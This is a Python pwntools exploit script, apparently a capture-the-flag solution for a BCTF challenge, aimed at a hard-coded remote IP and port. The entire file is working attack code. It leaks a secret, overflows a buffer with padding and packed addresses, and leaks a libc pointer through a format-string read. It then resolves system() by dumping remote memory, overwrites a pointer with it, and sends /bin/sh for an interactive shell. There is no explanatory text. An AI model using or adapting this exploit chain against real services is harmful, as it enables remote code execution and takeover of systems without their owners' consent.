from pwnlib import *
import memleak
import dynelf

"""
BCTF{H0w_3lf_Ru1n3d_XmaS}
"""

LOCAL = False

def clear():
	return s.ru("choice(1-4):")

if LOCAL:
	s = Socket(("localhost", 20023))
else:
	# remote: 0x76e1881c
	s = Socket(("166.111.132.49", 9999))


s.ru("-bit key:")
s.send("12345678")
s.ru("12345678")
result = s.ru(" is wrong")
secret = ud(result.ljust(4, chr(0)))

print "secret: 0x%x" % secret

s.send("security")
clear()

s.send("2\n")
s.ru("secret:")
s.send("A"*12 + pd(0xffffffff) + "\n")
clear()

size = (0x10F60 - secret)

s.send("3\n")
s.ru("length:")

s.send("%d\n" % size)
clear()

s.send("1\n")
s.ru(" key:")
s.send("A"*8 + pd(0x8594) + "\n"*4)
clear()

s.send("|%21$p|" + "\n")
result = s.ru("wrong choice")
clear()

libc_start_main = int(result.split("|")[1], 16)
print "libc_start_main: 0x%x" % libc_start_main


def leak(leak_from):
	print hex(leak_from)
	if "\x00" in pd(leak_from) or "\x0a" in pd(leak_from):
		return None
	s.send(pd(leak_from) + "%c%c%c%c||||%s||||\n")
	return clear().split("||||")[1] + "\x00"

leaker = memleak.MemLeak(leak)
libc_ptr = libc_start_main
de = dynelf.DynELF.from_lib_ptr(leaker, libc_ptr)

system = de.lookup("system")

print "system: 0x%x" % system

s.send("\n")
s.ru(" key:")
s.send("A"*8 + pd(system) + "\n"*4)
clear()


print "got shell?"
s.send("/bin/sh\n")
s.send("pwd\n")


s.interact()
